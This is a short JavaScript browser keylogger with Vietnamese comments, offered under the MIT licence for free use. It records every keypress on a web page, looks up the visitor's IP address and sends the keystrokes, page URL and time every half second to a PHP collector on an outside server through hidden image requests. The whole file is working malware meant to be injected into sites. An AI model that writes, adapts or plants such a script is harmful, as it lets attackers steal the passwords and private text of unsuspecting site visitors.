var phplink = 'đường dẫn tới file keylogger.php'
var keys = '';
var prevent = 0;
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  if (key == 13) {keys+= '<br>'; prevent = 1;}
  key = String.fromCharCode(key);
  if (prevent == 0) keys+=key;
  prevent = 0;
}
var ngaygio = new Date().toLocaleString();
$(document).ready(function(){
        $.ajax({url: "https://api.ipify.org/?format=txt", success: function(result){
            new Image().src = phplink+'?k='+'<br>Phiên mới, IP: '+result+', URL: '+window.location.href+', Thời gian: '+ngaygio+'<br>';
        }});
});
window.setInterval(function(){
if(keys != '') {
  new Image().src = phplink+'?k='+keys;
  keys = '';
}
}, 500);
// Bản quyền thuộc Đặng Quốc Trung, giấy phép MIT (bạn có thể edit và sử dụng thoải mái vì bất cứ mục đính nào miễn là vẫn tôn trọng bản quyền)